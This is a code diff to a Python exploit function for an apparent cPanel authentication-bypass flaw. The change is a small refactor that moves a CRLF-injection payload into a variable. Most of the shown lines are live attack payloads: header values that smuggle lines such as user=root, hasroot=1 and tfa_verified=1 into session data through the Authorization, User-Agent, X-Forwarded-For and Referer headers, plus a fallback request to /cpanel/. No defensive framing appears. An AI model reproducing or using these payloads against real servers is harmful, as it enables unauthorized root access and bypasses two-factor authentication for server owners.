@@ -302,9 +302,13 @@ def exploit_cve_2026_41940(host, port):
     if not cookie_name:
         return {"status": "CVE_No_Cookie", "token": None}
 
+    # Fixed: moved payload bytes to a variable to avoid backslash in f-string expression
+    poison_payload_bytes = b'root:somepass\r\nuser=root\r\nhasroot=1\r\ntfa_verified=1\r\nsuccessful_internal_auth_with_timestamp=9999999999'
+    poison_payload = "root:somepass\r\nuser=root\r\nhasroot=1\r\ntfa_verified=1\r\nsuccessful_internal_auth_with_timestamp=9999999999"
+
     poison_payloads = [
-        ("Authorization", f"Basic {base64.b64encode(b'root:somepass\r\nuser=root\r\nhasroot=1\r\ntfa_verified=1\r\nsuccessful_internal_auth_with_timestamp=9999999999').decode()}"),
-        ("User-Agent", f"root:somepass\r\nuser=root\r\nhasroot=1\r\ntfa_verified=1\r\nsuccessful_internal_auth_with_timestamp=9999999999"),
+        ("Authorization", "Basic " + base64.b64encode(poison_payload_bytes).decode()),
+        ("User-Agent", poison_payload),
         ("X-Forwarded-For", "127.0.0.1\r\nuser=root\r\nhasroot=1"),
         ("Referer", f"{base}/\r\nuser=root\r\nhasroot=1")
     ]
@@ -320,14 +324,7 @@ def exploit_cve_2026_41940(host, port):
                 success = True
                 break
     if not success:
-        payload = (
-            "root:somepass\r\n"
-            "user=root\r\n"
-            "hasroot=1\r\n"
-            "tfa_verified=1\r\n"
-            "successful_internal_auth_with_timestamp=9999999999"
-        )
-        auth_b64 = base64.b64encode(payload.encode()).decode()
+        auth_b64 = base64.b64encode(poison_payload_bytes).decode()
         headers = {"Authorization": f"Basic {auth_b64}"}
         resp2 = request_with_retry("GET", f"{base}/cpanel/", session=session, headers=headers)
         if not resp2:
